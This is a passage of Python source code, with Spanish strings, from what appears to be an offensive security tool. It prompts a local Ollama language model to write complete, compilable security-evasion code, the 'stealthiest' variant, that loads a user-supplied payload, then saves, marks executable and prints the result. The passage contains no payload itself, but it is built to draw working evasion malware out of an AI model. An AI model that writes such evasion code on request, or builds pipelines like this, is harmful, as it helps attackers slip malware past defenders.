        f"  Categoría: {tech.get('category','')}   OS: {tech.get('os','')}",
        f"  Lenguaje : {lang}   Arch: {arch}",
        f"  Payload  : {payload or '(sin payload específico)'}",
        f"  Riesgo   : {tech.get('risk','')}",
        "╚" + "═"*70 + "╝",
        "",
        f"  📖  {tech['description']}",
        "",
    ]

    # Contexto de código
    if tech.get("code_context"):
        lines.append("  📌  CONTEXTO TÉCNICO:")
        for cl in tech["code_context"].splitlines():
            lines.append(f"      {cl}")
        lines.append("")

    if tech.get("detections"):
        lines.append(f"  ⚠  Detecciones conocidas: {'; '.join(tech['detections'])}")
    if tech.get("countermeasures"):
        lines.append(f"  💡 Contramedidas: {tech['countermeasures']}")
    if tech.get("references"):
        lines.append(f"  🔗  Refs: {', '.join(tech['references'])}")
    lines.append("")

    # ── Elegir modelo ─────────────────────────────────────────────────────────
    used_model = model.strip() or _best_model()
    if not used_model:
        lines.append("  ✗ Sin modelo Ollama disponible. Configura OLLAMA_URL.")
        return {"success": False, "output": "\n".join(lines), "findings": []}

    lines.append(f"  ▶ Generando código con: {used_model}")
    lines.append("")

    # ── Prompt de generación ──────────────────────────────────────────────────
    payload_ctx = f"\nPayload/objetivo: {payload}" if payload else ""
    arch_ctx = f" para arquitectura {arch}"

    user_prompt = (
        f"Implementa la técnica de evasión '{technique}' ({tech['name']}) en {lang}{arch_ctx}.\n"
        f"{payload_ctx}\n\n"
        f"DESCRIPCIÓN DE LA TÉCNICA:\n{tech['description']}\n\n"
        f"CONTEXTO DE IMPLEMENTACIÓN:\n{tech.get('code_context','')}\n\n"
        f"REQUISITOS:\n"
        f"- Código COMPLETO y compilable en un único bloque ```{lang}.\n"
        f"- Sin placeholders, sin TODO, sin '...' — código real.\n"
        f"- Comenta qué hace cada sección de evasión.\n"
        f"- Para Windows: incluye includes necesarios (windows.h, etc).\n"
        f"- Para C/C++: incluye cómo compilar (MSVC o MinGW) en un comentario al inicio.\n"
        f"- Si hay múltiples técnicas variantes, implementa la más sigilosa.\n"
        + (f"- El payload a cargar/ejecutar es: {payload}\n" if payload else "")
        + f"Al final del bloque, añade 3-5 líneas de notas sobre cómo usar y compilar."
    )

    messages = [
        {"role": "system", "content": _SYSTEM},
        {"role": "user", "content": user_prompt},
    ]

    content, err = _ollama_chat(used_model, messages)
    if err:
        lines.append(f"  ✗ Error de Ollama: {err}")
        return {"success": False, "output": "\n".join(lines), "findings": []}

    code = _extract_code(content)
    if not code or len(code) < 50:
        lines.append("  ✗ El modelo no devolvió código utilizable.")
        lines.append("\n  Respuesta:\n" + content[:1000])
        return {"success": False, "output": "\n".join(lines), "findings": []}

    # ── Guardar ───────────────────────────────────────────────────────────────
    ext = _EXT.get(lang, "txt")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    slug = _slug(technique)
    base_dir = Path(output_dir) if output_dir else Path.cwd()
    dev_dir = base_dir / "dev" / "evasion"
    dev_dir.mkdir(parents=True, exist_ok=True)
    code_path = dev_dir / f"{slug}_{ts}.{ext}"
    code_path.write_text(code, encoding="utf-8")
    try:
        if ext in ("sh", "py"):
            os.chmod(code_path, 0o755)
    except Exception:
        pass

    # README
    readme = dev_dir / f"{slug}_{ts}_README.md"
    readme.write_text(
        f"# {tech['name']}\n\n"
        f"- **Técnica:** `{technique}`\n"
        f"- **Categoría:** {tech.get('category','')}\n"
        f"- **OS:** {tech.get('os','')}\n"
        f"- **Lenguaje:** {lang} / {arch}\n"
        f"- **Modelo:** {used_model}\n"
        f"- **Archivo:** `{code_path.name}`\n"
        f"- **Riesgo detección:** {tech.get('risk','')}\n\n"
        f"## Descripción\n\n{tech['description']}\n\n"
        + (f"## Contexto técnico\n\n```\n{tech.get('code_context','')}\n```\n\n"
           if tech.get('code_context') else "")
        + (f"## Detecciones conocidas\n\n- " + "\n- ".join(tech.get("detections",[]))
           + "\n\n" if tech.get("detections") else "")
        + (f"## Referencias\n\n- " + "\n- ".join(tech.get("references", []))
           + "\n\n" if tech.get("references") else ""),
        encoding="utf-8")

    lines.append(f"{'═'*60}")
    lines.append(f"  ✅  CÓDIGO GENERADO:")
    lines.append(f"      {code_path}")
    lines.append(f"      {readme}")
    lines.append(f"  Tamaño: {len(code)} chars / {code.count(chr(10))+1} líneas")
    lines.append(f"  Modelo: {used_model}")
    lines.append(f"{'═'*60}")
    lines.append("")
    lines.append("  ─── CÓDIGO ─────────────────────────────────────────────")
    lines.append(code[:3000] + ("\n  [... truncado — ver archivo ...]" if len(code) > 3000 else ""))
    lines.append("  ────────────────────────────────────────────────────────")

    findings = [{
        "type": "evasion_code",
        "value": str(code_path),
        "severity": "info",
        "technique": technique,
        "category": tech.get("category", ""),
        "description": f"Código de evasión '{technique}' generado: {code_path.name}",
    }]

    return {
        "success": True,
        "output": "\n".join(lines),
        "findings": findings,
        "technique": technique,
        "code_file": str(code_path),
        "readme": str(readme),
        "model_used": used_model,
        "output_dir": str(dev_dir),
    }
